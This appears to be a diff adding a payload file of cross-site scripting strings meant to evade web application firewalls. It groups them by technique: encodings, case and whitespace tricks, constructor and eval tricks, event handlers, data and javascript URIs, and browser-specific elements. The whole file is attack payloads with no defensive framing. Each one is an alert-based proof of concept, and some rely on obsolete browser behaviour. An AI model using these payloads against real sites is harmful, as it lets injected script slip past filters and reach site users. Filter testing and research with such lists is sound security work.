@@ -1,0 +1,164 @@
+# WAF Bypass Techniques and Payloads
+
+# Case variations
+<ScRiPt>alert('XSS')</ScRiPt>
+<SCRIPT>alert('XSS')</SCRIPT>
+<sCrIpT>alert('XSS')</sCrIpT>
+
+# HTML encoding
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
+
+# URL encoding
+%3Cscript%3Ealert('XSS')%3C/script%3E
+%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%27%58%53%53%27%29%3c%2f%73%63%72%69%70%74%3e
+
+# Double encoding
+%253Cscript%253Ealert('XSS')%253C/script%253E
+
+# Unicode encoding
+\u003cscript\u003ealert('XSS')\u003c/script\u003e
+
+# Hex encoding
+\x3cscript\x3ealert('XSS')\x3c/script\x3e
+
+# Octal encoding
+\74script\76alert('XSS')\74/script\76
+
+# Mixed encoding
+%3Cscr\u0069pt%3Ealert('XSS')%3C/scr\u0069pt%3E
+
+# Comment-based bypass
+<script>/**/alert('XSS')/**/</script>
+<script>alert/**/('XSS')</script>
+<script>al/**/ert('XSS')</script>
+
+# Whitespace variations
+<script >alert('XSS')</script >
+<script	>alert('XSS')</script	>
+<script
+>alert('XSS')</script
+>
+
+# Alternative quote marks
+<script>alert("XSS")</script>
+<script>alert('XSS')</script>
+<script>alert(`XSS`)</script>
+
+# No quotes
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(/XSS/.source)</script>
+
+# Concatenation
+<script>alert('X'+'S'+'S')</script>
+<script>alert('X'.concat('S','S'))</script>
+
+# Template literals
+<script>alert`XSS`</script>
+<script>alert(`XSS`)</script>
+
+# Function construction
+<script>Function('alert("XSS")')();</script>
+<script>new Function('alert("XSS")')();</script>
+<script>[]['filter']['constructor']('alert("XSS")')();</script>
+
+# Eval alternatives
+<script>eval('alert("XSS")')</script>
+<script>setTimeout('alert("XSS")',1)</script>
+<script>setInterval('alert("XSS")',1)</script>
+
+# Property access variations
+<script>window['alert']('XSS')</script>
+<script>window.alert('XSS')</script>
+<script>self['alert']('XSS')</script>
+<script>top['alert']('XSS')</script>
+
+# Alternative event handlers
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onpageshow=alert('XSS')>
+<iframe onload=alert('XSS')>
+<object onload=alert('XSS')>
+
+# SVG variations
+<svg><script>alert('XSS')</script></svg>
+<svg onload="alert('XSS')">
+<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
+
+# Data URIs
+<iframe src="data:text/html,<script>alert('XSS')</script>">
+<object data="data:text/html,<script>alert('XSS')</script>">
+<embed src="data:text/html,<script>alert('XSS')</script>">
+
+# JavaScript pseudo-protocol
+<iframe src="javascript:alert('XSS')">
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+
+# Form-based bypass
+<form><button formaction="javascript:alert('XSS')">Submit</button></form>
+<form><input type=submit formaction="javascript:alert('XSS')" value="Submit"></form>
+
+# Meta refresh
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+
+# Base tag
+<base href="javascript:alert('XSS')//">
+
+# Link prefetch
+<link rel="prefetch" href="javascript:alert('XSS')">
+<link rel="dns-prefetch" href="javascript:alert('XSS')">
+
+# CSS injection
+<style>@import'javascript:alert("XSS")';</style>
+<style>body{background:url('javascript:alert("XSS")')}</style>
+
+# Alternative script sources
+<script src="data:text/javascript,alert('XSS')"></script>
+<script src="data:application/javascript,alert('XSS')"></script>
+
+# Fragment identifier
+<script>location.hash='javascript:alert("XSS")'</script>
+
+# DOM manipulation
+<script>document.body.innerHTML='<img src=x onerror=alert("XSS")>'</script>
+<script>document.write('<script>alert("XSS")<\/script>')</script>
+
+# RegExp bypass
+<script>alert(/XSS/.source)</script>
+<script>/XSS/.source.constructor.constructor('alert("XSS")')();</script>
+
+# Array method abuse
+<script>[]['find']['constructor']('alert("XSS")')();</script>
+<script>[]['map']['constructor']('alert("XSS")')();</script>
+
+# Error-based execution
+<script>try{throw'alert("XSS")'}catch(e){eval(e)}</script>
+
+# Length limitation bypass
+<q/oncut=alert('XSS')>
+<input/oncut=alert('XSS')>
+<keygen/onfocus=alert('XSS')/autofocus>
+
+# HTML5 elements
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+<meter onmouseover=alert('XSS') value=2 min=0 max=10>
+<progress onmouseover=alert('XSS') value=10 max=100>
+
+# WebKit/Blink specific
+<video poster=javascript:alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+
+# Firefox specific
+<iframe srcdoc="<script>alert('XSS')</script>">
+
+# IE specific
+<xml id=x><a><b>&lt;script&gt;alert('XSS')&lt;/script&gt;</b></a></xml>
+<span datasrc=#x datafld=b dataformatas=html></span>
+
+# Edge cases
+<<script>alert('XSS')</script>
+<script<script>alert('XSS')</script>
+<script>alert('XSS')</script
